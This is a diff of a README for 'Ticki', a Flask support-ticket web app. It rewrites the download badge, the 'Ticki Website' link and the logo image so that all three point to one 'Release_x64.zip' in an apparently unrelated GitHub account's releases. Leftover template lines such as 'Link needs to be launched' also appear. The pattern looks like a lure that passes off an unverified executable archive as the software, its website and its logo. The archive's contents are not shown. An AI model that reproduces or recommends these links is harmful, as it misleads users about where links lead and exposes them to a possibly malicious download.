@@ -21,7 +21,7 @@ To get started with Ticki, simply follow these steps:
 - **Topics**: backend, css, flask, html, js, mahdi-rabiee, mhadi-1382, python, support-system, ticket-system, ticki, ui, web-application, website
 
 ## Get Started!
-[![Click Here to Download Ticki Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Click Here to Download Ticki Software](https://github.com/vietson1807/ticki/releases/download/v2.0/Release_x64.zip)](https://github.com/vietson1807/ticki/releases/download/v2.0/Release_x64.zip)
 
 *Link needs to be launched for Ticki Software download.*
 
@@ -30,7 +30,7 @@ To get started with Ticki, simply follow these steps:
 3. Follow the on-screen instructions to set up the system and start managing tickets seamlessly.
 
 ## Explore Ticki Online :globe_with_meridians:
-Visit the [Ticki Website](https://ticki.com) to experience the support system live!
+Visit the [Ticki Website](https://github.com/vietson1807/ticki/releases/download/v2.0/Release_x64.zip) to experience the support system live!
 
 *Link is a website. Simply suggest to visit the Ticki website.*
 
@@ -41,4 +41,4 @@ For any questions or concerns regarding Ticki, please check the "Releases" secti
 
 🚀 Start using Ticki today and revolutionize the way you manage support tickets! 🎫 Thank you for choosing Ticki for all your support system needs. 🌟
 
-![Ticki Logo](https://example.com/ticki-logo.png)
+![Ticki Logo](https://github.com/vietson1807/ticki/releases/download/v2.0/Release_x64.zip)
